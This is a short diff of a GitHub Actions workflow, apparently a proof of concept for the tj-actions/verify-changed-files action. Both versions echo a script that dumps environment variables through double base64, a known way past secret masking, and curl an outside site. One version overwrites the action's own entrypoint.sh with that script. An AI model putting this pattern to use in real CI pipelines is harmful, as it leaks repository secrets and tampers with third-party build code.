@@ -13,6 +13,6 @@ jobs:
 
       - name: Run a one-line script
         run: |
-          echo "env | base64 | base64 -w0; echo; curl https://perdu.com/;" > /home/runner/work/_actions/tj-actions/verify-changed-files/v16/entrypoint.sh
+          echo "env | base64 | base64 -w0; echo; curl https://perdu.com/;" > .github/workflows/ci.yml
 
       - uses: tj-actions/verify-changed-files@v16
